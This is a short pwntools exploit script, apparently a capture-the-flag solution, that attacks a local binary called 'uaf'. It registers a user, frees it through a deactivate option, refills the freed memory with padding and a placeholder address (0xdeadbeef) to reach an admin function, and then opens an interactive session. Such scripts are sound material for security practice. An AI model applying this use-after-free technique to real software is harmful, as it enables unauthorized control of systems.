from pwn import *

p = process("../uaf")

def register(s: bytes):
  p.sendline(b"1")
  p.sendline(s)

def deactivate():
  p.sendline(b"2")

def service(s: bytes):
  p.sendline(b"3")
  p.sendline(s[:0x24])

def admin():
  p.sendline(b"0")


register("nick".encode('ascii'))
deactivate()
service((b"A"*24+p64(0xdeadbeef)).replace(b'\x00', b''))
admin()
p.interactive()
